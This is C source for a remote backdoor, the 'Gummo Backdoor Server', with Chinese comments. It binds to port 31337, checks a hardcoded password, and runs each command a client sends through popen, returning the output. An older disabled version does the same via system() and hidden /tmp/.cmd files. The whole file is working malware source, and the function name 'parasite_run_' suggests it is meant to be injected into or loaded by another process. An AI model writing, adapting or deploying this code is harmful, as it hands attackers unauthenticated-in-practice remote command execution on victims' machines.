#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/select.h>
#include <time.h>

#define PORT 31337
#define BACKLOG 5
#define CMD_LOG "/tmp/.cmd"
#define PASSWORD "password"
#define MAX_CLIENTS 10
#define BUFFER_SIZE 1024

struct client_state {
    int fd;                     // 客户端socket
    int authenticated;          // 认证状态
    char buffer[BUFFER_SIZE];   // 数据缓冲区
    int buffer_len;            // 缓冲区中的数据长度
};

// 初始化客户端状态
void init_client_state(struct client_state* state) {
    state->fd = -1;
    state->authenticated = 0;
    state->buffer_len = 0;
    memset(state->buffer, 0, BUFFER_SIZE);
}

void hello() {
    printf("I just got loaded\n");
}

__attribute__((constructor)) void loadMsg() {
    hello();
}

// 处理客户端命令
#if(0)
void handle_command(int fd, char* cmd_dat) {
    FILE* read;
    char cmd_relay[1024];
    char clean_log[1024];
    char buf[5000];
    char filename[256];

    memset(filename, 0, 256);
    srand(time(NULL));

    // 生成随机文件名
    int random_number = rand() % 1000000000;
    snprintf(filename, 255, "%s%x", CMD_LOG, random_number);

    if (strcmp(cmd_dat, "quit") == 0) {
        close(fd);
        return;
    }

    // 执行命令并重定向输出
    snprintf(cmd_relay, 1024, "%s > %s", cmd_dat, filename);
    system(cmd_relay);

    // 读取并发送结果
    if ((read = fopen(filename, "r")) != NULL) {
        while (!feof(read)) {
            memset(buf, 0, 500);
            if (fgets(buf, 500, read) != NULL) {
                write(fd, buf, strlen(buf));
            }
        }
        fclose(read);
    }

    // 清理临时文件
    sprintf(clean_log, "rm %s", filename);
    system(clean_log);
}
#endif
void handle_command(int fd, char* cmd_dat) {
    FILE* pipe;
    char buf[5000];

    if (strcmp(cmd_dat, "quit") == 0) {
        close(fd);
        return;
    }

    // 使用popen执行命令并获取输出
    if ((pipe = popen(cmd_dat, "r")) == NULL) {
        send(fd, "Command execution failed\n", 24, 0);
        return;
    }

    // 读取并发送结果
    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        write(fd, buf, strlen(buf));
    }

    pclose(pipe);
}
int parasite_run_() {
    int server_fd;
    struct sockaddr_in server_addr;
    struct client_state clients[MAX_CLIENTS];
    fd_set read_fds;
    int max_fd;
    char buffer[BUFFER_SIZE];

    // 初始化客户端状态数组
    for (int i = 0; i < MAX_CLIENTS; i++) {
        init_client_state(&clients[i]);
    }

    // 创建服务器socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    // 设置地址重用
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(server_addr.sin_zero), 8);

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }

    printf("Server listening on port %d\n", PORT);

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(server_fd, &read_fds);
        max_fd = server_fd;

        // 添加客户端socket到select集合
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (clients[i].fd > 0) {
                FD_SET(clients[i].fd, &read_fds);
                if (clients[i].fd > max_fd) {
                    max_fd = clients[i].fd;
                }
            }
        }

        // 等待事件
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            perror("select");
            continue;
        }

        // 处理新连接
        if (FD_ISSET(server_fd, &read_fds)) {
            struct sockaddr_in client_addr;
            socklen_t sin_size = sizeof(client_addr);
            int new_fd = accept(server_fd, (struct sockaddr*)&client_addr, &sin_size);

            if (new_fd < 0) {
                perror("accept");
                continue;
            }

            // 查找空闲的客户端槽位
            int slot = -1;
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (clients[i].fd < 0) {
                    slot = i;
                    break;
                }
            }

            if (slot >= 0) {
                clients[slot].fd = new_fd;
                clients[slot].authenticated = 0;
                // 发送密码提示
                send(new_fd, "Password: ", 10, 0);
            }
            else {
                close(new_fd);
            }
        }

        // 处理客户端数据
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (clients[i].fd > 0 && FD_ISSET(clients[i].fd, &read_fds)) {
                memset(buffer, 0, BUFFER_SIZE);
                int bytes = recv(clients[i].fd, buffer, BUFFER_SIZE - 1, 0);

                if (bytes <= 0) {
                    // 连接关闭
                    close(clients[i].fd);
                    init_client_state(&clients[i]);
                    continue;
                }

                // 处理换行符
                char* gp;
                if ((gp = strchr(buffer, '\n')) != NULL) *gp = '\0';
                if ((gp = strchr(buffer, '\r')) != NULL) *gp = '\0';

                if (!clients[i].authenticated) {
                    // 验证密码
                    if (strcmp(buffer, PASSWORD) == 0) {
                        clients[i].authenticated = 1;
                        send(clients[i].fd, "Access Granted, HEH\n", 19, 0);
                        send(clients[i].fd, "\n\n\n\n\n\nWelcome To Gummo Backdoor Server!\n\n", 41, 0);
                        send(clients[i].fd, "Type 'HELP' for a list of commands\n\n", 36, 0);
                        send(clients[i].fd, "command:~# ", 11, 0);
                    }
                    else {
                        send(clients[i].fd, "Authentication Failed! =/\n", 24, 0);
                        close(clients[i].fd);
                        init_client_state(&clients[i]);
                    }
                }
                else {
                    // 处理命令
                    handle_command(clients[i].fd, buffer);
                    if (strcmp(buffer, "quit") != 0) {
                        send(clients[i].fd, "command:~# ", 11, 0);
                    }
                    else {
                        init_client_state(&clients[i]);
                    }
                }
            }
        }
    }

    return 0;
}